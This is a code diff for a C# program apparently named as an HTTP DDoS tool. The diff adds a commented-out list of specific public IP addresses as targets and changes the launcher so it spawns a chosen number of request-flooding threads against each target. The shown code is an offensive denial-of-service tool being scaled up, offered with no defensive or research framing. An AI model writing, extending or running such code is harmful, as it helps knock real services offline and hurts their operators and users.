@@ -13,6 +13,15 @@ namespace HttpIdeadDdosProgram
         static List<string> ipaddresses = new();
         static void Main(string[] args)
         {
+            //args = new string[]
+            //{"3",
+            //"80.68.247.26",
+            //"195.218.193.151",
+            //"5.255.255.70",
+            //"5.255.255.77",
+            //"77.88.55.60",
+            //"77.88.55.88",
+            //"195.218.193.151" };
             int threads = int.Parse(args[0]);
 
             for (int i = 1; i < args.Length; i++)
@@ -25,7 +34,7 @@ namespace HttpIdeadDdosProgram
             foreach (var item in ipaddresses)
             {
                 //Console.WriteLine(item);
-                DdosManager.Launch(ipaddresses);
+                DdosManager.Launch(threads,ipaddresses);
             }
 
             Console.ReadKey();
@@ -35,13 +44,16 @@ namespace HttpIdeadDdosProgram
     class DdosManager
     {
         public static List<Thread> list=new();
-        public static void Launch(List<string> ips)
+        public static void Launch(int threads, List<string> ips)
         {
             try
             {
                 foreach (var item in ips)
                 {
-                    list.Add(new Thread(async () => await new DdosGoAhead().SendRequest(item)));
+                    for (int i = 0; i < threads; i++)
+                    {
+                        list.Add(new Thread(async () => await new DdosGoAhead().SendRequest(item)));
+                    }
                 }
                 LaunchThreads();
             }
